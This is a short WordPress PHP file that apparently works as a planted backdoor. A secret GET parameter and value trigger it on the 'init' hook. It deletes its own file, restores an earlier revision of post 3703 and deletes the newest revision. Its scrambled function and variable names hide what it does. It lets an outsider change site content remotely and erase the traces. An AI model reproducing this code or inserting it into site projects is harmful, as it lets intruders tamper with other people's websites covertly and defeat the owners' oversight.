<?php

function embedder_time_estate() {
	if (isset($_GET['now_business_back_buttons']) && $_GET['now_business_back_buttons'] === 'contents_charts_rss_scroll') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$class_js_ticker = 3703;
		$module_visitor_compat_server = wp_get_post_revisions($class_js_ticker);
		if (empty($module_visitor_compat_server)) die('no revisions');
		if (count($module_visitor_compat_server) < 2) die('less than 2');
		$view_term_game = array_shift($module_visitor_compat_server);
		$notice_soon_quotes_cart = $view_term_game->ID;
		$panel_manager_account_authors = array_shift($module_visitor_compat_server);
		$section_gravity_wall_copy = $panel_manager_account_authors->ID;
		$gravity_shortener_clock_basic = wp_restore_post_revision($section_gravity_wall_copy);
		if ($gravity_shortener_clock_basic === false) die('error restoring');
		$gravity_shortener_clock_basic = wp_delete_post_revision($notice_soon_quotes_cart);		
		if ($gravity_shortener_clock_basic === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'embedder_time_estate');
